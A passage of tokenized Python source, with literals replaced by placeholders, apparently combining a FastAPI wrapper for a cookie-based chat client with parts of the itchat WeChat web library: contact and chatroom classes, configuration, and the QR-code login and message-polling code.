: str , prompt : str ) : <EOL> cookie = get_cookie ( ) <EOL> client = Client ( cookie ) <EOL> response = client . send_message ( prompt , conversation_id ) <EOL> return { "<STR_LIT>" : response } <EOL> @ app . post ( "<STR_LIT>" ) <EOL> async def reset_conversations ( ) : <EOL> cookie = get_cookie ( ) <EOL> client = Client ( cookie ) <EOL> result = client . reset_all ( ) <EOL> return { "<STR_LIT>" : result } <EOL> @ app . post ( "<STR_LIT>" ) <EOL> async def rename_conversation ( conversation_id : str , title : str ) : <EOL> cookie = get_cookie ( ) <EOL> client = Client ( cookie ) <EOL> result = client . rename_chat ( title , conversation_id ) <EOL> return { "<STR_LIT>" : result } <EOL> @ app . post ( "<STR_LIT>" ) <EOL> async def upload_attachment ( file : UploadFile ) : <EOL> cookie = get_cookie ( ) <EOL> client = Client ( cookie ) <EOL> file_path = save_upload_file ( file ) <EOL> response = client . upload_attachment ( file_path ) <EOL> return { "<STR_LIT>" : response } <EOL> def save_upload_file ( uploaded_file ) : <EOL> file_path = f"<STR_LIT>" <EOL> with open ( file_path , "<STR_LIT>" ) as buffer : <EOL> buffer . write ( uploaded_file . file . read ( ) ) <EOL> return file_path <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def list_all_conversations ( ) : <EOL> cookie = get_cookie ( ) <EOL> client = Client ( cookie ) <EOL> conversations = client . list_all_conversations ( ) <EOL> return { "<STR_LIT>" : conversations } <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def chat_conversation_history ( conversation_id ) : <EOL> cookie = get_cookie ( ) <EOL> client = Client ( cookie ) <EOL> history = client . chat_conversation_history ( conversation_id ) <EOL> return { "<STR_LIT>" : history } <EOL> </s>
<s> import logging , copy , pickle <EOL> from weakref import ref <EOL> from . . returnvalues import ReturnValue <EOL> from . . utils import update_info_dict <EOL> logger = logging . getLogger ( '<STR_LIT>' ) <EOL> class AttributeDict ( dict ) : <EOL> def __getattr__ ( self , value ) : <EOL> keyName = value [ <NUM_LIT> ] . upper ( ) + value [ <NUM_LIT> : ] <EOL> try : <EOL> return self [ keyName ] <EOL> except KeyError : <EOL> raise AttributeError ( "<STR_LIT>" % ( <EOL> self . __class__ . __name__ . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] , keyName ) ) <EOL> def get ( self , v , d = None ) : <EOL> try : <EOL> return self [ v ] <EOL> except KeyError : <EOL> return d <EOL> class UnInitializedItchat ( object ) : <EOL> def _raise_error ( self , * args , ** kwargs ) : <EOL> logger . warning ( '<STR_LIT>' ) <EOL> def __getattr__ ( self , value ) : <EOL> return self . _raise_error <EOL> class ContactList ( list ) : <EOL> def __init__ ( self , * args , ** kwargs ) : <EOL> super ( ContactList , self ) . __init__ ( * args , ** kwargs ) <EOL> self . __setstate__ ( None ) <EOL> @ property <EOL> def core ( self ) : <EOL> return getattr ( self , '<STR_LIT>' , lambda : fakeItchat ) ( ) or fakeItchat <EOL> @ core . setter <EOL> def core ( self , value ) : <EOL> self . _core = ref ( value ) <EOL> def set_default_value ( self , initFunction = None , contactClass = None ) : <EOL> if hasattr ( initFunction , '<STR_LIT>' ) : <EOL> self . contactInitFn = initFunction <EOL> if hasattr ( contactClass , '<STR_LIT>' ) : <EOL> self . contactClass = contactClass <EOL> def append ( self , value ) : <EOL> contact = self . contactClass ( value ) <EOL> contact . core = self . core <EOL> if self . contactInitFn is not None : <EOL> contact = self . contactInitFn ( self , contact ) or contact <EOL> super ( ContactList , self ) . append ( contact ) <EOL> def __deepcopy__ ( self , memo ) : <EOL> r = self . __class__ ( [ copy . deepcopy ( v ) for v in self ] ) <EOL> r . contactInitFn = self . contactInitFn <EOL> r . contactClass = self . contactClass <EOL> r . core = self . core <EOL> return r <EOL> def __getstate__ ( self ) : <EOL> return <NUM_LIT> <EOL> def __setstate__ ( self , state ) : <EOL> self . contactInitFn = None <EOL> self . contactClass = User <EOL> def __str__ ( self ) : <EOL> return '<STR_LIT>' % '<STR_LIT>' . join ( [ repr ( v ) for v in self ] ) <EOL> def __repr__ ( self ) : <EOL> return '<STR_LIT>' % ( self . __class__ . __name__ . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] , <EOL> self . __str__ ( ) ) <EOL> class AbstractUserDict ( AttributeDict ) : <EOL> def __init__ ( self , * args , ** kwargs ) : <EOL> super ( AbstractUserDict , self ) . __init__ ( * args , ** kwargs ) <EOL> @ property <EOL> def core ( self ) : <EOL> return getattr ( self , '<STR_LIT>' , lambda : fakeItchat ) ( ) or fakeItchat <EOL> @ core . setter <EOL> def core ( self , value ) : <EOL> self . _core = ref ( value ) <EOL> def update ( self ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def set_alias ( self , alias ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def set_pinned ( self , isPinned = True ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def verify ( self ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def get_head_image ( self , imageDir = None ) : <EOL> return self . core . get_head_img ( self . userName , picDir = imageDir ) <EOL> def delete_member ( self , userName ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def add_member ( self , userName ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def send_raw_msg ( self , msgType , content ) : <EOL> return self . core . send_raw_msg ( msgType , content , self . userName ) <EOL> def send_msg ( self , msg = '<STR_LIT>' ) : <EOL> return self . core . send_msg ( msg , self . userName ) <EOL> def send_file ( self , fileDir , mediaId = None ) : <EOL> return self . core . send_file ( fileDir , self . userName , mediaId ) <EOL> def send_image ( self , fileDir , mediaId = None ) : <EOL> return self . core . send_image ( fileDir , self . userName , mediaId ) <EOL> def send_video ( self , fileDir = None , mediaId = None ) : <EOL> return self . core . send_video ( fileDir , self . userName , mediaId ) <EOL> def send ( self , msg , mediaId = None ) : <EOL> return self . core . send ( msg , self . userName , mediaId ) <EOL> def search_member ( self , name = None , userName = None , remarkName = None , nickName = None , <EOL> wechatAccount = None ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def __deepcopy__ ( self , memo ) : <EOL> r = self . __class__ ( ) <EOL> for k , v in self . items ( ) : <EOL> r [ copy . deepcopy ( k ) ] = copy . deepcopy ( v ) <EOL> r . core = self . core <EOL> return r <EOL> def __str__ ( self ) : <EOL> return '<STR_LIT>' % '<STR_LIT>' . join ( <EOL> [ '<STR_LIT>' % ( repr ( k ) , repr ( v ) ) for k , v in self . items ( ) ] ) <EOL> def __repr__ ( self ) : <EOL> return '<STR_LIT>' % ( self . __class__ . __name__ . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] , <EOL> self . __str__ ( ) ) <EOL> def __getstate__ ( self ) : <EOL> return <NUM_LIT> <EOL> def __setstate__ ( self , state ) : <EOL> pass <EOL> class User ( AbstractUserDict ) : <EOL> def __init__ ( self , * args , ** kwargs ) : <EOL> super ( User , self ) . __init__ ( * args , ** kwargs ) <EOL> self . __setstate__ ( None ) <EOL> def update ( self ) : <EOL> r = self . core . update_friend ( self . userName ) <EOL> if r : <EOL> update_info_dict ( self , r ) <EOL> return r <EOL> def set_alias ( self , alias ) : <EOL> return self . core . set_alias ( self . userName , alias ) <EOL> def set_pinned ( self , isPinned = True ) : <EOL> return self . core . set_pinned ( self . userName , isPinned ) <EOL> def verify ( self ) : <EOL> return self . core . add_friend ( ** self . verifyDict ) <EOL> def __deepcopy__ ( self , memo ) : <EOL> r = super ( User , self ) . __deepcopy__ ( memo ) <EOL> r . verifyDict = copy . deepcopy ( self . verifyDict ) <EOL> return r <EOL> def __setstate__ ( self , state ) : <EOL> super ( User , self ) . __setstate__ ( state ) <EOL> self . verifyDict = { } <EOL> self [ '<STR_LIT>' ] = fakeContactList <EOL> class MassivePlatform ( AbstractUserDict ) : <EOL> def __init__ ( self , * args , ** kwargs ) : <EOL> super ( MassivePlatform , self ) . __init__ ( * args , ** kwargs ) <EOL> self . __setstate__ ( None ) <EOL> def __setstate__ ( self , state ) : <EOL> super ( MassivePlatform , self ) . __setstate__ ( state ) <EOL> self [ '<STR_LIT>' ] = fakeContactList <EOL> class Chatroom ( AbstractUserDict ) : <EOL> def __init__ ( self , * args , ** kwargs ) : <EOL> super ( Chatroom , self ) . __init__ ( * args , ** kwargs ) <EOL> memberList = ContactList ( ) <EOL> userName = self . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> refSelf = ref ( self ) <EOL> def init_fn ( parentList , d ) : <EOL> d . chatroom = refSelf ( ) or parentList . core . search_chatrooms ( userName = userName ) <EOL> memberList . set_default_value ( init_fn , ChatroomMember ) <EOL> if '<STR_LIT>' in self : <EOL> for member in self . memberList : <EOL> memberList . append ( member ) <EOL> self [ '<STR_LIT>' ] = memberList <EOL> @ property <EOL> def core ( self ) : <EOL> return getattr ( self , '<STR_LIT>' , lambda : fakeItchat ) ( ) or fakeItchat <EOL> @ core . setter <EOL> def core ( self , value ) : <EOL> self . _core = ref ( value ) <EOL> self . memberList . core = value <EOL> for member in self . memberList : <EOL> member . core = value <EOL> def update ( self , detailedMember = False ) : <EOL> r = self . core . update_chatroom ( self . userName , detailedMember ) <EOL> if r : <EOL> update_info_dict ( self , r ) <EOL> self [ '<STR_LIT>' ] = r [ '<STR_LIT>' ] <EOL> return r <EOL> def set_alias ( self , alias ) : <EOL> return self . core . set_chatroom_name ( self . userName , alias ) <EOL> def set_pinned ( self , isPinned = True ) : <EOL> return self . core . set_pinned ( self . userName , isPinned ) <EOL> def delete_member ( self , userName ) : <EOL> return self . core . delete_member_from_chatroom ( self . userName , userName ) <EOL> def add_member ( self , userName ) : <EOL> return self . core . add_member_into_chatroom ( self . userName , userName ) <EOL> def search_member ( self , name = None , userName = None , remarkName = None , nickName = None , <EOL> wechatAccount = None ) : <EOL> with self . core . storageClass . updateLock : <EOL> if ( name or userName or remarkName or nickName or wechatAccount ) is None : <EOL> return None <EOL> elif userName : <EOL> for m in self . memberList : <EOL> if m . userName == userName : <EOL> return copy . deepcopy ( m ) <EOL> else : <EOL> matchDict = { <EOL> '<STR_LIT>' : remarkName , <EOL> '<STR_LIT>' : nickName , <EOL> '<STR_LIT>' : wechatAccount , } <EOL> for k in ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) : <EOL> if matchDict [ k ] is None : <EOL> del matchDict [ k ] <EOL> if name : <EOL> contact = [ ] <EOL> for m in self . memberList : <EOL> if any ( [ m . get ( k ) == name for k in ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) ] ) : <EOL> contact . append ( m ) <EOL> else : <EOL> contact = self . memberList [ : ] <EOL> if matchDict : <EOL> friendList = [ ] <EOL> for m in contact : <EOL> if all ( [ m . get ( k ) == v for k , v in matchDict . items ( ) ] ) : <EOL> friendList . append ( m ) <EOL> return copy . deepcopy ( friendList ) <EOL> else : <EOL> return copy . deepcopy ( contact ) <EOL> def __setstate__ ( self , state ) : <EOL> super ( Chatroom , self ) . __setstate__ ( state ) <EOL> if not '<STR_LIT>' in self : <EOL> self [ '<STR_LIT>' ] = fakeContactList <EOL> class ChatroomMember ( AbstractUserDict ) : <EOL> def __init__ ( self , * args , ** kwargs ) : <EOL> super ( AbstractUserDict , self ) . __init__ ( * args , ** kwargs ) <EOL> self . __setstate__ ( None ) <EOL> @ property <EOL> def chatroom ( self ) : <EOL> r = getattr ( self , '<STR_LIT>' , lambda : fakeChatroom ) ( ) <EOL> if r is None : <EOL> userName = getattr ( self , '<STR_LIT>' , '<STR_LIT>' ) <EOL> r = self . core . search_chatrooms ( userName = userName ) <EOL> if isinstance ( r , dict ) : <EOL> self . chatroom = r <EOL> return r or fakeChatroom <EOL> @ chatroom . setter <EOL> def chatroom ( self , value ) : <EOL> if isinstance ( value , dict ) and '<STR_LIT>' in value : <EOL> self . _chatroom = ref ( value ) <EOL> self . _chatroomUserName = value [ '<STR_LIT>' ] <EOL> def get_head_image ( self , imageDir = None ) : <EOL> return self . core . get_head_img ( self . userName , self . chatroom . userName , picDir = imageDir ) <EOL> def delete_member ( self , userName ) : <EOL> return self . core . delete_member_from_chatroom ( self . chatroom . userName , self . userName ) <EOL> def send_raw_msg ( self , msgType , content ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def send_msg ( self , msg = '<STR_LIT>' ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def send_file ( self , fileDir , mediaId = None ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def send_image ( self , fileDir , mediaId = None ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def send_video ( self , fileDir = None , mediaId = None ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def send ( self , msg , mediaId = None ) : <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' % self . __class__ . __name__ , } , } ) <EOL> def __setstate__ ( self , state ) : <EOL> super ( ChatroomMember , self ) . __setstate__ ( state ) <EOL> self [ '<STR_LIT>' ] = fakeContactList <EOL> def wrap_user_dict ( d ) : <EOL> userName = d . get ( '<STR_LIT>' ) <EOL> if '<STR_LIT>' in userName : <EOL> r = Chatroom ( d ) <EOL> elif d . get ( '<STR_LIT>' , <NUM_LIT> ) & <NUM_LIT> == <NUM_LIT> : <EOL> r = User ( d ) <EOL> else : <EOL> r = MassivePlatform ( d ) <EOL> return r <EOL> fakeItchat = UnInitializedItchat ( ) <EOL> fakeContactList = ContactList ( ) <EOL> fakeChatroom = Chatroom ( ) <EOL> </s>
<s> import os , platform <EOL> VERSION = '<STR_LIT>' <EOL> ASYNC_COMPONENTS = os . environ . get ( '<STR_LIT>' , False ) <EOL> BASE_URL = '<STR_LIT>' <EOL> OS = platform . system ( ) <EOL> DIR = os . getcwd ( ) <EOL> DEFAULT_QR = '<STR_LIT>' <EOL> TIMEOUT = ( <NUM_LIT> , <NUM_LIT> ) <EOL> USER_AGENT = '<STR_LIT>' <EOL> UOS_PATCH_CLIENT_VERSION = '<STR_LIT>' <EOL> UOS_PATCH_EXTSPAM = '<STR_LIT>' <EOL> </s>
<s> import os <EOL> import time <EOL> import re <EOL> import io <EOL> import threading <EOL> import json <EOL> import xml . dom . minidom <EOL> import random <EOL> import traceback <EOL> import logging <EOL> try : <EOL> from httplib import BadStatusLine <EOL> except ImportError : <EOL> from http . client import BadStatusLine <EOL> import requests <EOL> from pyqrcode import QRCode <EOL> from . . import config , utils <EOL> from . . returnvalues import ReturnValue <EOL> from . . storage . templates import wrap_user_dict <EOL> from . contact import update_local_chatrooms , update_local_friends <EOL> from . messages import produce_msg <EOL> logger = logging . getLogger ( '<STR_LIT>' ) <EOL> def load_login ( core ) : <EOL> core . login = login <EOL> core . get_QRuuid = get_QRuuid <EOL> core . get_QR = get_QR <EOL> core . check_login = check_login <EOL> core . web_init = web_init <EOL> core . show_mobile_login = show_mobile_login <EOL> core . start_receiving = start_receiving <EOL> core . get_msg = get_msg <EOL> core . logout = logout <EOL> def login ( self , enableCmdQR = False , picDir = None , qrCallback = None , <EOL> loginCallback = None , exitCallback = None ) : <EOL> if self . alive or self . isLogging : <EOL> logger . warning ( '<STR_LIT>' ) <EOL> return <EOL> self . isLogging = True <EOL> logger . info ( '<STR_LIT>' ) <EOL> while self . isLogging : <EOL> uuid = push_login ( self ) <EOL> if uuid : <EOL> qrStorage = io . BytesIO ( ) <EOL> else : <EOL> logger . info ( '<STR_LIT>' ) <EOL> while not self . get_QRuuid ( ) : <EOL> time . sleep ( <NUM_LIT> ) <EOL> logger . info ( '<STR_LIT>' ) <EOL> qrStorage = self . get_QR ( enableCmdQR = enableCmdQR , <EOL> picDir = picDir , qrCallback = qrCallback ) <EOL> isLoggedIn = False <EOL> while not isLoggedIn : <EOL> status = self . check_login ( ) <EOL> if hasattr ( qrCallback , '<STR_LIT>' ) : <EOL> qrCallback ( uuid = self . uuid , status = status , <EOL> qrcode = qrStorage . getvalue ( ) ) <EOL> if status == '<STR_LIT>' : <EOL> isLoggedIn = True <EOL> elif status == '<STR_LIT>' : <EOL> if isLoggedIn is not None : <EOL> logger . info ( '<STR_LIT>' ) <EOL> isLoggedIn = None <EOL> time . sleep ( <NUM_LIT> ) <EOL> time . sleep ( <NUM_LIT> ) <EOL> elif status != '<STR_LIT>' : <EOL> break <EOL> if isLoggedIn : <EOL> break <EOL> elif self . isLogging : <EOL> logger . info ( '<STR_LIT>' ) <EOL> else : <EOL> return <EOL> logger . info ( '<STR_LIT>' ) <EOL> self . web_init ( ) <EOL> self . show_mobile_login ( ) <EOL> self . get_contact ( True ) <EOL> if hasattr ( loginCallback , '<STR_LIT>' ) : <EOL> r = loginCallback ( ) <EOL> else : <EOL> if os . path . exists ( picDir or config . DEFAULT_QR ) : <EOL> os . remove ( picDir or config . DEFAULT_QR ) <EOL> logger . info ( '<STR_LIT>' % self . storageClass . nickName ) <EOL> self . start_receiving ( exitCallback ) <EOL> self . isLogging = False <EOL> def push_login ( core ) : <EOL> cookiesDict = core . s . cookies . get_dict ( ) <EOL> if '<STR_LIT>' in cookiesDict : <EOL> url = '<STR_LIT>' % ( <EOL> config . BASE_URL , cookiesDict [ '<STR_LIT>' ] ) <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> r = core . s . get ( url , headers = headers ) . json ( ) <EOL> if '<STR_LIT>' in r and r . get ( '<STR_LIT>' ) in ( <NUM_LIT> , '<STR_LIT>' ) : <EOL> core . uuid = r [ '<STR_LIT>' ] <EOL> return r [ '<STR_LIT>' ] <EOL> return False <EOL> def get_QRuuid ( self ) : <EOL> url = '<STR_LIT>' % config . BASE_URL <EOL> params = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' } <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> r = self . s . get ( url , params = params , headers = headers ) <EOL> regx = r'<STR_LIT>' <EOL> data = re . search ( regx , r . text ) <EOL> if data and data . group ( <NUM_LIT> ) == '<STR_LIT>' : <EOL> self . uuid = data . group ( <NUM_LIT> ) <EOL> return self . uuid <EOL> def get_QR ( self , uuid = None , enableCmdQR = False , picDir = None , qrCallback = None ) : <EOL> uuid = uuid or self . uuid <EOL> picDir = picDir or config . DEFAULT_QR <EOL> qrStorage = io . BytesIO ( ) <EOL> qrCode = QRCode ( '<STR_LIT>' + uuid ) <EOL> qrCode . png ( qrStorage , scale = <NUM_LIT> ) <EOL> if hasattr ( qrCallback , '<STR_LIT>' ) : <EOL> qrCallback ( uuid = uuid , status = '<STR_LIT>' , qrcode = qrStorage . getvalue ( ) ) <EOL> else : <EOL> with open ( picDir , '<STR_LIT>' ) as f : <EOL> f . write ( qrStorage . getvalue ( ) ) <EOL> if enableCmdQR : <EOL> utils . print_cmd_qr ( qrCode . text ( <NUM_LIT> ) , enableCmdQR = enableCmdQR ) <EOL> else : <EOL> utils . print_qr ( picDir ) <EOL> return qrStorage <EOL> def check_login ( self , uuid = None ) : <EOL> uuid = uuid or self . uuid <EOL> url = '<STR_LIT>' % config . BASE_URL <EOL> localTime = int ( time . time ( ) ) <EOL> params = '<STR_LIT>' % ( <EOL> uuid , int ( - localTime / <NUM_LIT> ) , localTime ) <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> r = self . s . get ( url , params = params , headers = headers ) <EOL> regx = r'<STR_LIT>' <EOL> data = re . search ( regx , r . text ) <EOL> if data and data . group ( <NUM_LIT> ) == '<STR_LIT>' : <EOL> if process_login_info ( self , r . text ) : <EOL> return '<STR_LIT>' <EOL> else : <EOL> return '<STR_LIT>' <EOL> elif data : <EOL> return data . group ( <NUM_LIT> ) <EOL> else : <EOL> return '<STR_LIT>' <EOL> def process_login_info ( core , loginContent ) : <EOL> regx = r'<STR_LIT>' <EOL> core . loginInfo [ '<STR_LIT>' ] = re . search ( regx , loginContent ) . group ( <NUM_LIT> ) <EOL> headers = { '<STR_LIT>' : config . USER_AGENT , <EOL> '<STR_LIT>' : config . UOS_PATCH_CLIENT_VERSION , <EOL> '<STR_LIT>' : config . UOS_PATCH_EXTSPAM , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> r = core . s . get ( core . loginInfo [ '<STR_LIT>' ] , <EOL> headers = headers , allow_redirects = False ) <EOL> core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] [ : core . loginInfo [ '<STR_LIT>' ] . rfind ( <EOL> '<STR_LIT>' ) ] <EOL> for indexUrl , detailedUrl in ( <EOL> ( "<STR_LIT>" , ( "<STR_LIT>" , "<STR_LIT>" ) ) , <EOL> ( "<STR_LIT>" , ( "<STR_LIT>" , "<STR_LIT>" ) ) , <EOL> ( "<STR_LIT>" , ( "<STR_LIT>" , "<STR_LIT>" ) ) , <EOL> ( "<STR_LIT>" , ( "<STR_LIT>" , "<STR_LIT>" ) ) , <EOL> ( "<STR_LIT>" , ( "<STR_LIT>" , "<STR_LIT>" ) ) ) : <EOL> fileUrl , syncUrl = [ '<STR_LIT>' % <EOL> url for url in detailedUrl ] <EOL> if indexUrl in core . loginInfo [ '<STR_LIT>' ] : <EOL> core . loginInfo [ '<STR_LIT>' ] , core . loginInfo [ '<STR_LIT>' ] = fileUrl , syncUrl <EOL> break <EOL> else : <EOL> core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] <EOL> core . loginInfo [ '<STR_LIT>' ] = '<STR_LIT>' + repr ( random . random ( ) ) [ <NUM_LIT> : <NUM_LIT> ] <EOL> core . loginInfo [ '<STR_LIT>' ] = int ( time . time ( ) * <NUM_LIT> ) <EOL> core . loginInfo [ '<STR_LIT>' ] = { } <EOL> cookies = core . s . cookies . get_dict ( ) <EOL> res = re . findall ( '<STR_LIT>' , r . text , re . S ) <EOL> skey = res [ <NUM_LIT> ] if res else None <EOL> res = re . findall ( <EOL> '<STR_LIT>' , r . text , re . S ) <EOL> pass_ticket = res [ <NUM_LIT> ] if res else None <EOL> if skey is not None : <EOL> core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] [ '<STR_LIT>' ] = skey <EOL> core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] [ '<STR_LIT>' ] = cookies [ "<STR_LIT>" ] <EOL> core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] [ '<STR_LIT>' ] = cookies [ "<STR_LIT>" ] <EOL> if pass_ticket is not None : <EOL> core . loginInfo [ '<STR_LIT>' ] = pass_ticket <EOL> if not all ( [ key in core . loginInfo for key in ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) ] ) : <EOL> logger . error ( <EOL> '<STR_LIT>' % r . text ) <EOL> core . isLogging = False <EOL> return False <EOL> return True <EOL> def web_init ( self ) : <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> params = { <EOL> '<STR_LIT>' : int ( - time . time ( ) / <NUM_LIT> ) , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , } <EOL> data = { '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , } <EOL> headers = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : config . USER_AGENT , } <EOL> r = self . s . post ( url , params = params , data = json . dumps ( data ) , headers = headers ) <EOL> dic = json . loads ( r . content . decode ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> utils . emoji_formatter ( dic [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> self . loginInfo [ '<STR_LIT>' ] = int ( dic [ '<STR_LIT>' ] ) <EOL> self . loginInfo [ '<STR_LIT>' ] = wrap_user_dict ( <EOL> utils . struct_friend_info ( dic [ '<STR_LIT>' ] ) ) <EOL> self . memberList . append ( self . loginInfo [ '<STR_LIT>' ] ) <EOL> self . loginInfo [ '<STR_LIT>' ] = dic [ '<STR_LIT>' ] <EOL> self . loginInfo [ '<STR_LIT>' ] = '<STR_LIT>' . join ( [ '<STR_LIT>' % ( item [ '<STR_LIT>' ] , item [ '<STR_LIT>' ] ) <EOL> for item in dic [ '<STR_LIT>' ] [ '<STR_LIT>' ] ] ) <EOL> self . storageClass . userName = dic [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> self . storageClass . nickName = dic [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> contactList = dic . get ( '<STR_LIT>' , [ ] ) <EOL> chatroomList , otherList = [ ] , [ ] <EOL> for m in contactList : <EOL> if m [ '<STR_LIT>' ] != <NUM_LIT> : <EOL> otherList . append ( m ) <EOL> elif '<STR_LIT>' in m [ '<STR_LIT>' ] : <EOL> m [ '<STR_LIT>' ] = [ ] <EOL> chatroomList . append ( m ) <EOL> elif '<STR_LIT>' in m [ '<STR_LIT>' ] : <EOL> otherList . append ( m ) <EOL> if chatroomList : <EOL> update_local_chatrooms ( self , chatroomList ) <EOL> if otherList : <EOL> update_local_friends ( self , otherList ) <EOL> return dic <EOL> def show_mobile_login ( self ) : <EOL> url = '<STR_LIT>' % ( <EOL> self . loginInfo [ '<STR_LIT>' ] , self . loginInfo [ '<STR_LIT>' ] ) <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : int ( time . time ( ) ) , } <EOL> headers = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : config . USER_AGENT , } <EOL> r = self . s . post ( url , data = json . dumps ( data ) , headers = headers ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> def start_receiving ( self , exitCallback = None , getReceivingFnOnly = False ) : <EOL> self . alive = True <EOL> def maintain_loop ( ) : <EOL> retryCount = <NUM_LIT> <EOL> while self . alive : <EOL> try : <EOL> i = sync_check ( self ) <EOL> if i is None : <EOL> self . alive = False <EOL> elif i == '<STR_LIT>' : <EOL> pass <EOL> else : <EOL> msgList , contactList = self . get_msg ( ) <EOL> if msgList : <EOL> msgList = produce_msg ( self , msgList ) <EOL> for msg in msgList : <EOL> self . msgList . put ( msg ) <EOL> if contactList : <EOL> chatroomList , otherList = [ ] , [ ] <EOL> for contact in contactList : <EOL> if '<STR_LIT>' in contact [ '<STR_LIT>' ] : <EOL> chatroomList . append ( contact ) <EOL> else : <EOL> otherList . append ( contact ) <EOL> chatroomMsg = update_local_chatrooms ( <EOL> self , chatroomList ) <EOL> chatroomMsg [ '<STR_LIT>' ] = self . loginInfo [ '<STR_LIT>' ] <EOL> self . msgList . put ( chatroomMsg ) <EOL> update_local_friends ( self , otherList ) <EOL> retryCount = <NUM_LIT> <EOL> except requests . exceptions . ReadTimeout : <EOL> pass <EOL> except : <EOL> retryCount += <NUM_LIT> <EOL> logger . error ( traceback . format_exc ( ) ) <EOL> if self . receivingRetryCount < retryCount : <EOL> logger . error ( "<STR_LIT>" % ( <EOL> retryCount ) + "<STR_LIT>" ) <EOL> self . alive = False <EOL> else : <EOL> time . sleep ( <NUM_LIT> ) <EOL> self . logout ( ) <EOL> if hasattr ( exitCallback , '<STR_LIT>' ) : <EOL> exitCallback ( ) <EOL> else : <EOL> logger . info ( '<STR_LIT>' ) <EOL> if getReceivingFnOnly : <EOL> return maintain_loop <EOL> else : <EOL> maintainThread = threading . Thread ( target = maintain_loop ) <EOL> maintainThread . setDaemon ( True ) <EOL> maintainThread . start ( ) <EOL> def sync_check ( self ) : <EOL> url = '<STR_LIT>' % self . loginInfo . get ( '<STR_LIT>' , self . loginInfo [ '<STR_LIT>' ] ) <EOL> params = { <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , 